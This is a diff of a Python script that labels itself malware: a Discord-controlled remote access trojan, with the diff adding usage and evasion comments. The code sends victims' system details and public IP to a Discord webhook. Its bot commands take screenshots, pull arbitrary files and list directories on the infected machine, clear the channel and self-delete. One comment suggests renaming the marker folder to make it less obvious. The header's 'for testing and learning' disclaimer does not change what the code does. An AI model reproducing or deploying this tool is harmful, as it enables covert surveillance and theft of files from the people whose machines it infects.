@@ -2,7 +2,7 @@
 # THIS IS VERY CLEARLY MALWARE!!!
 # DO NOT USE IT AS SUCH.
 # THIS CODE IS ONLY FOR TESTING AND LEARNING!
-# IF YOU INSTALL THIS ON SOMEONE ELSE’S MACHINE YOU WILL HAVE JUST COMMITTED:
+# IF YOU INSTALL THIS ON SOMEONE ELSE’S MACHINE YOU MAY HAVE JUST COMMITTED:
 # A FELONY
 import os
 import requests
@@ -12,6 +12,9 @@ import platform
 import time
 import datetime
 
+# ''' pip install requests python-dotenv
+
+
 debug = True
 def debug_print(content):
     if debug == True:
@@ -19,7 +22,7 @@ def debug_print(content):
 
 dotenv.load_dotenv()
 
-def discord_post(embed):
+def discord_post(embed): # You may have to modify this function if you attempt to send something other than an embed.
     url = os.getenv("URL")
     data = {
         "embeds": [embed] 
@@ -34,11 +37,11 @@ cpu_core_count = os.cpu_count()
 current_user = os.getlogin()                  #ex. ben, admin
 host_name = socket.gethostname()              #server1, cool-laptop
 local_ip_address = socket.gethostbyname(host_name)
-public_ip_address = requests.get('https://api.ipify.org').text
+public_ip_address = requests.get('https://api.ipify.org').text #Get ip from some api i got from chatgpt, trust it if you want IDK.
 boot_timestamp = time.time()
 boot_time_str = datetime.datetime.fromtimestamp(boot_timestamp).strftime("%Y-%m-%d %H:%M:%S")
 
-if os.path.isdir("google_packet"):
+if os.path.isdir("google_packet"): #Checks if this is the second time running the script.
     embed = {
         "title": f"System Boot - {host_name}",
         "color": 0x808080,
@@ -51,7 +54,7 @@ if os.path.isdir("google_packet"):
     }
 else:
     embed = {
-        "title": f"System Information - {host_name}",
+        "title": f"System Information - {host_name}", #Only shows on first run.
         "color": 0x00ff00,
         "fields": [
             {"name": "Operating System", "value": operating_system, "inline": True},
@@ -68,33 +71,33 @@ else:
 discord_post(embed)
 
 try:
-    os.makedirs("google_packet", exist_ok=True)
+    os.makedirs("google_packet", exist_ok=True) #You can change the name (change the check to) if you want it to be less obvious.
 except Exception as e:
     debug_print(f"[Error] Failed to make dir: {e}")
 
 import discord
 from discord.ext import commands
 
-intents = discord.Intents.all()
+intents = discord.Intents.all() #Be sure to change the perms on your discord bot to get that to work.
 intents.message_content = True
 
 bot = commands.Bot(command_prefix="!", intents=intents)
-infected_ip = "123.123.0.12"
+infected_ip = "123.123.0.12" #Defult ip you can hard code or do whatever idc
 
 @bot.event
 async def on_ready():
     print(f"Bot logged in as {bot.user}")
 
 @bot.command()
-async def ping(ctx):
-    await ctx.send(f"Pong! ({public_ip_address})")
+async def ping(ctx): #Format: !ping
+    await ctx.send(f"Pong! ({public_ip_address})") #Use to test all online machines (well NOT NEEDED CUZ THERE IS ONLY 1 **RIGHT**)
 
 @bot.command()
 async def run(ctx):
     await ctx.send("Starting your process now!")
 
 @bot.command()
-async def kill(ctx):
+async def kill(ctx): #Format: !kill
     global infected_ip
     if infected_ip != public_ip_address:
         await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
@@ -109,12 +112,12 @@ async def kill(ctx):
     except Exception as e:
         print(f"Error deleting {file_path}: {e}")
 
-    await ctx.send(f"Killing script on {host_name}/{public_ip_address}")
+    await ctx.send(f"Killing script on {host_name}/{public_ip_address}") #Should delete script.
 
 import io
 
 @bot.command()
-async def screenshot(ctx):
+async def screenshot(ctx): #Format: !screenshot
     global infected_ip
     if infected_ip != public_ip_address:
         await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
@@ -129,7 +132,7 @@ async def screenshot(ctx):
 
 
 @bot.command()
-async def get_file(ctx, *, filepath: str):
+async def get_file(ctx, *, filepath: str): #Format: !get_file <path>
     global infected_ip
     if infected_ip != public_ip_address:
         await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
@@ -143,7 +146,7 @@ async def get_file(ctx, *, filepath: str):
         await ctx.send(f"Failed to send file: {e}")
 
 @bot.command()
-async def list_files(ctx, *, dir: str):
+async def list_files(ctx, *, dir: str): #Format: !list_files <path>
     global infected_ip
     if infected_ip != public_ip_address:
         await ctx.send("No infected machine IP set. Use !infected_machine_ip <ip> first.")
@@ -167,13 +170,13 @@ async def list_files(ctx, *, dir: str):
         await ctx.send("Please send !list_files <filepath>")
 
 @bot.command()
-@commands.has_permissions(manage_messages=True)
-async def purge_channel(ctx, amount: int = 100):
+@commands.has_permissions(manage_messages=True) #Make sure bot has make perms if possible.
+async def purge_channel(ctx, amount: int = 100): #Format: !clear_channel
     deleted = await ctx.channel.purge(limit=amount + 1)
     await ctx.send(f"✅ Deleted {len(deleted) - 1} messages.", delete_after=3)
 
 @bot.command()
-async def infected_machine_ip(ctx, ip: str):
+async def infected_machine_ip(ctx, ip: str): #Format: !infected_machine_ip <Public_Ip>
     import ipaddress
     global infected_ip
     try:
